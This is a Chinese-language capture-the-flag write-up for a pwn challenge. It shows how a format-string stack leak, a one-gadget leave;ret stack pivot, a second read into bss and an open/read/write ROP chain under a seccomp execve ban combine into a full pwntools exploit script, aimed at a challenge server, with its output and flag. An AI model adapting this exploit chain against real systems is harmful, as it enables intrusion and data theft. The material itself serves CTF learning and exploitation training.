# DASCTF message board (pwn) WP

## 1. 题目信息

- 题目：DASCTF message board（留言板）
- 类型：pwn / 栈溢出 + 格式化字符串泄漏 + `leave;ret` 栈迁移 + 二次 read 到 bss + ORW
- 远端：`49.232.142.230:11561`（最初为 `10270`，实例重启后端口变为 `11561`，以当前端口为准）
- 附件：`challenges/pwn`
  - sha256：`3603c26c85c22b771dc2fa0e4b539dd490a4aee7bbb13ba20eb715f90e91faa4`
  - ELF 64-bit LSB executable, x86-64, dynamically linked, **stripped**
- 运行环境：
  - 远端 libc：**glibc 2.31-0ubuntu9.10**（Ubuntu 20.04）
    - sha256：`7ee6f1d397c152dc83caeb6a86e888d9f86e5f0c2d33559a9100923bda872cd4`
    - 通过 libc.rip 用 `puts`/`read` 两个泄漏地址指纹匹配得到
  - 二进制编译串：`GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0`
  - 调试：Ubuntu x86_64 Lima VM（gdb + pwntools）
- Flag：`flag{81b05037e85cf206f63ebd941bff1079}`

## 2. 侦察

```
$ file challenges/pwn
challenges/pwn: ELF 64-bit LSB executable, x86-64, ... dynamically linked, stripped

$ # 保护（pwntools checksec）
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
SHSTK/IBT: Enabled   # 仅为 GNU property，远端未强制（后续 ROP 正常）
```

关键导入：只有 `read / puts / printf / strcat / setvbuf / alarm` 以及 libseccomp
（`seccomp_init / seccomp_rule_add / seccomp_load`），**没有 `system`、`open`、`write`**。

```
$ strings -n5 challenges/pwn
...
libseccomp.so.2
seccomp_rule_add
Welcome to DASCTF message board, please leave your name:
Now, please say something to DASCTF:
Posted Successfully~
```

远端交互：

```
$ nc 49.232.142.230 11561
Welcome to DASCTF message board, please leave your name:
```

程序入口 `main = 0x4012e3`，其中调用了一个初始化函数 `0x401236`。反汇编初始化函数可见 seccomp 配置：

```
40129c: mov edi, 0x1e            ; alarm(30)
4012a1: call alarm
4012a6: mov edi, 0x7fff0000      ; seccomp_init(SCMP_ACT_ALLOW)
4012ab: call seccomp_init
4012b4: mov rax,[rbp-8]          ; ctx
4012b8: mov ecx, 0               ; arg_cnt = 0
4012bd: mov edx, 0x3b            ; syscall = 59 = execve
4012c2: mov esi, 0               ; action = SCMP_ACT_KILL
4012c7: mov rdi, rax
4012cf: call seccomp_rule_add
4012d4: mov rax,[rbp-8]
4012db: call seccomp_load
```

**只禁了 `execve`** —— `open/read/write` 全部可用，因此拿到控制流后走 ORW 即可。

## 3. 漏洞分析

`main`（`0x4012e3`）伪代码：

```c
void main(void) {
    init();                              // setvbuf + alarm(30) + seccomp(no execve)
    if (flag == 0) {                     // flag @ 0x4040ac
        *(u64*)(rbp-0xb8) = "Hello, ";   // rbp-184，8 字节
        puts("Welcome ... please leave your name:");
        read(0, rbp-0xc0, 8);            // rbp-192: 8 字节 name
        flag = 1;
    }
    strcat(rbp-0xb8, rbp-0xc0);          // "Hello, " + name
    printf(rbp-0xb8);                    // <-- 格式化字符串
    puts("Now, please say something to DASCTF:");
    read(0, rbp-0xb0, 192);              // rbp-176: 192 字节 message
    puts("Posted Successfully~");
}
```

栈帧（`sub rsp, 0xc0`，`rbp = F`）：

| 地址 | 用途 |
| --- | --- |
| `F-0xc0` | name[8]（第一次 read） |
| `F-0xb8` | `"Hello, "` 拼接缓冲（`printf` 的格式串） |
| `F-0xb0` | message[192]（第二次 read） |
| `F+0x00` | saved rbp |
| `F+0x08` | saved rip |

`read(0, F-0xb0, 0x c0)` 写入 `F-0xb0 .. F+0x0f`，即刚好覆盖 saved rbp（偏移 176）与
saved rip（偏移 **184**）。溢出末尾只有 8 字节可控 RIP，**没有**剩余空间摆 ROP 链
（这也是本题的第一道坎）。

同时存在两个可利用点：

1. **格式化字符串**：`printf("Hello, " + name)`，`name` 只有 8 字节，通过 `%1$p` 可泄漏
   栈地址。经 gdb 确认 `%1$` 即 `rsi` = name 缓冲地址 = `F-0xc0`。
2. **`strcat` 无界拷贝**：`name` 填满 8 字节无 `\0` 时，`strcat` 会把 `F-0xb8` 处的
   `"Hello, "` 也当成源串继续拼接（源在目标之前，写入指针追过源），直到遇到栈上第一个
   `\0`。第一次调用时 `F-0xb0`（message）为 0，因此最终格式串为
   `"Hello, " + name + "Hello, "`。

gdb 实测（`break *0x401367`，即 `printf` 调用点）：

```
rdi = 0x7fffffffe928 -> "Hello, AAAAAAAAHello, "
rsi = 0x7fffffffe920   # %1$ = name 缓冲地址（栈）
rdx = 0xf              # %2$
rcx = 0x4141414141414141
r8  = 0x38
r9  = 0x202c6f6c6c6548 # "Hello, "
```

配合第 31 个参数 `%31$ = [rbp+8]` 就是返回 libc 的地址；本题改用 `%1$p` 先泄栈地址。

## 4. 利用原理（关键中间值）

由于溢出只能写 8 字节 RIP，采用 **栈迁移 + 二次可控 read** 的两段式：

- `%1$p` 泄漏 name 缓冲地址 `stack = F-0xc0`。
- message 缓冲地址 `msgbuf = stack + 16 = F-0xb0`。
- 溢出 payload 布局（192 字节）：
  - `[0:176]` 第一段 ROP / 占位
  - `[176:184]` saved rbp = `msgbuf`
  - `[184:192]` saved rip = `leave;ret` gadget `0x4012e1`

`main` 的 `leave; ret` 执行后 `rbp = msgbuf`；再执行 `leave;ret` 时
`rsp = rbp = msgbuf`，于是 ROP 从 message 缓冲里执行 —— **栈迁移成功**，可用空间 192 字节。

第一段链：

```
[0:8]   'B'*8                                   (迁移后弹入 rbp，占位)
[8:16]  pop rdi ; ret        (0x401413)
[16:24] puts@got            (0x404028)
[24:32] puts@plt            (0x4010e0)          -> printf/puts 泄 libc
[32:40] pop rbp ; ret        (0x40121d)
[40:48] R = 0x404200                            -> 给 read-tail 设 rbp
[48:56] READ_TAIL           (0x401378)
[160:168] "/flag\0\0\0"                          -> 后续 open 的文件名（栈地址已知）
[176:184] msgbuf
[184:192] leave_ret (0x4012e1)
```

其中 `READ_TAIL = 0x401378` 是 `main` 尾部“设置 `edx=0xc0` 后 `read`”的那段代码：

```
401378: lea rax,[rbp-0xb0]
40137f: mov edx, 0xc0
401384: mov rsi, rax
401387: mov edi, 0
40138c: call read          ; read(0, rbp-0xb0, 192)
401391: lea rdi,"Posted Successfully~"
401398: call printf
4013a2: leave
4013a3: ret
```

跳到这里时 `rbp = R = 0x404200`，于是 **第二次 read 的 192 字节落到 bss**
（`0x404150 .. 0x404210`，该页由 RW LOAD 段映射，可写），并且读完后仍用 `leave;ret`
以我们控制的 saved rbp/rip 收尾 —— 这样在**知道 libc 基址之后**还能再发一条完整 ROP。

命中 libc 后（`puts` 泄漏 6 字节），用 glibc 2.31 偏移：

| 符号 / gadget | 偏移 |
| --- | --- |
| `puts` | `0x84420`（泄漏基准） |
| `open` | `0x10dce0` |
| `read` | `0x10dfc0` |
| `write` | `0x10e060` |
| `pop rdi ; ret` | `0x23b6a` |
| `pop rsi ; ret` | `0x2601f` |
| `pop rdx ; pop r12 ; ret` | `0x119211` |

第二段（发往 bss 的 192 字节 `b2`）：

```
[0:8]   'D'*8                            (bss 缓冲迁移后弹入 rbp，占位)
         open(fname, 0)
         read(3, outbuf, 0x100)
         write(1, outbuf, 0x100)
[176:184] buf = R-176 = 0x404150         (save rbp -> 回到 bss 缓冲开头)
[184:192] leave_ret (0x4012e1)
```

链共 21 个 qword = 168 字节，加 8 字节占位正好 176 字节，给末尾 16 字节的迁移数据留出空间。
`fname` 用第一段写在栈上的 `/flag`（地址 `msgbuf+160`），`outbuf = 0x404300`。

libc 基址：`base = puts_leak - 0x84420`。
（远端实测 `puts = 0x7fcc9e9a2420`，`base = 0x7fcc9e91e000`。）

## 5. 攻击链

```
name="%1$p" ──> printf 泄漏 name 缓冲地址 stack ──> msgbuf=stack+16
      │
message(192) ──> saved rbp=msgbuf, saved rip=leave_ret
      │
main ret ──> leave;ret 迁移到 msgbuf ──> ROP:
      │                                   puts(puts@got)  ──> libc base
      │                                   pop rbp=0x404200; jmp READ_TAIL
      │
READ_TAIL: read(0, 0x404150, 192)  <── 第二段 b2 (拿到 libc 后构造)
      │
leave;ret 再到 bss 缓冲 ──> ORW:
        open("/flag",0)
        read(3, outbuf, 0x100)
        write(1, outbuf, 0x100)
      │
flag{...}
```

## 6. 完整利用脚本

保存于 `exploits/msgboard.py`，命令：

```bash
# 远端（端口会轮换，可显式指定 host/port）
.venv/bin/python exploits/msgboard.py remote
.venv/bin/python exploits/msgboard.py remote 49.232.142.230 11561
# 本地（Linux）
.venv/bin/python exploits/msgboard.py
```

```python
#!/usr/bin/env python3
import sys, os
sys.path = [q for q in sys.path if os.path.abspath(q or '.') != os.path.dirname(os.path.abspath(__file__))]
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

BIN = os.path.join(os.path.dirname(__file__), '..', 'challenges', 'pwn')
HOST, PORT = '49.232.142.230', 11561

pop_rdi   = 0x401413
pop_rbp   = 0x40121d
puts_plt  = 0x4010e0
puts_got  = 0x404028
leave_ret = 0x4012e1
READ_TAIL = 0x401378

PUTS_OFF    = 0x84420
OPEN_OFF    = 0x10dce0
READ_OFF    = 0x10dfc0
WRITE_OFF   = 0x10e060
POP_RDI     = 0x23b6a
POP_RSI     = 0x2601f
POP_RDX_R12 = 0x119211

R, buf, outbuf = 0x404200, 0x404200 - 176, 0x404300
flag = b'/flag'

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        return remote(HOST, PORT, timeout=10)
    return process(BIN)

def exploit():
    io = start()
    io.recvuntil(b'name:')
    io.send(b'%1$p\x00\x00\x00\x00')
    out = io.recvuntil(b'Now, please say something to DASCTF:')
    msgbuf = int(re.search(rb'0x[0-9a-f]+', out).group(), 16) + 16
    log.info('stack msgbuf @ %#x', msgbuf)

    b1  = b'B' * 8
    b1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
    b1 += p64(pop_rbp) + p64(R) + p64(READ_TAIL)
    b1  = b1.ljust(160, b'C') + flag.ljust(8, b'\x00')
    b1  = b1.ljust(176, b'C') + p64(msgbuf) + p64(leave_ret)
    assert len(b1) == 192
    io.send(b1)

    io.recvuntil(b'Posted Successfully~', timeout=5)
    line = io.recvline()
    lb = line[:6] if line.strip() != b'' else io.recvn(6)
    if line.strip() == b'':
        io.recvline()
    puts = u64(lb.ljust(8, b'\x00'))
    base = puts - PUTS_OFF
    log.success('puts=%#x libc=%#x', puts, base)
    pop_rdi, pop_rsi, pop_rdx = base + POP_RDI, base + POP_RSI, base + POP_RDX_R12
    fname = msgbuf + 160

    b2  = b'D' * 8
    b2 += p64(pop_rdi) + p64(fname) + p64(pop_rsi) + p64(0) + p64(base + OPEN_OFF)
    b2 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(outbuf) + p64(pop_rdx) + p64(0x100) + p64(0) + p64(base + READ_OFF)
    b2 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(outbuf) + p64(pop_rdx) + p64(0x100) + p64(0) + p64(base + WRITE_OFF)
    assert len(b2) == 176, len(b2)
    b2  = b2.ljust(176, b'D') + p64(buf) + p64(leave_ret)
    io.send(b2)
    print(io.recvall(timeout=4))

if __name__ == '__main__':
    exploit()
```

## 7. 运行输出

```
$ .venv/bin/python exploits/msgboard.py remote
[x] Opening connection to 49.232.142.230 on port 11561
[*] stack msgbuf @ 0x7fff94596ca0
[+] puts leak = 0x7fcc9e9a2420  libc base = 0x7fcc9e91e000
b'Posted Successfully~\nflag{81b05037e85cf206f63ebd941bff1079}\n\x00\x00...'
```

Flag：`flag{81b05037e85cf206f63ebd941bff1079}`

## 8. 踩坑 / 死路

- **溢出长度陷阱**：`read` 只有 192 字节，saved rip 正好是最后 8 字节，**不能**在栈上直接
  摆 ROP 链。必须先 `%1$p` 泄栈，再用 `leave;ret` 把栈迁移到 message 缓冲。
- **二次 read 的寄存器**：直接 ROP `read(0,bss,n)` 需要 `rdx`，但二进制没有 `pop rdx`。
  改跳 `READ_TAIL`（`0x401378`），它自己 `mov edx,0xc0`，顺带用 `rbp` 指定写入地址。
- **迁移后链的起始偏移**：`leave;ret` 会先 `pop rbp` 再 `ret`，所以 ROP 实际从缓冲
  `[8:]` 开始，最前面 8 字节只是占位。少加这 8 字节会整体错位、跳到 libc 文件偏移
  （曾看到 `SIGSEGV si_addr=0x2a3e5`，即未加基址的 `pop rdi` gadget）。
- **pwntools `ELF.search` 会随 `elf.address` 自动加基址**：若在设置 `libc.address` 之后
  再手动 `+ libc.address`，会**重复加基址**。正确做法是设置 `libc.address` 后直接用
  `libc.search(...)`/`libc.symbols[...]`。
- **leak 解析**：`puts` 泄出的是原始 6 字节（高位为 `\0`），后面跟一个 `\n`。直接
  `recvline()` 在地址字节里含 `0x0a` 时会截断，应固定读 6 字节。
- **端口会变**：实例重开后端口从 `10270` 变为 `11561`，写死端口需留意。
- **`strcat` 的副作用**：name 填满 8 字节无 `\0` 时，格式串会变成
  `"Hello, " + name + "Hello, "`（本题不影响利用，但 `%N$` 计数要按实际格式串算）。
- **seccomp 只杀 execve**：`system`/one_gadget 均不可用，必须 ORW。

## 9. 验证

- Flag 两次独立连接均为 `flag{81b05037e85cf206f63ebd941bff1079}`，格式为 `flag{32位hex}`。
- 本地 Lima Ubuntu 22.04 复现：自建 `/flag` 后 `exploits/msgboard.py`（本地 libc）输出
  `DASCTF{local_test_flag_123}`，验证利用链与 libc 偏移无关（只换 libc 常量）。
- 远端 libc 用 `puts`/`read` 两个泄漏地址在 libc.rip 指纹匹配，唯一命中
  `libc6_2.31-0ubuntu9.10_amd64`；`base + read_off` 与实测 `read` 泄漏完全一致。
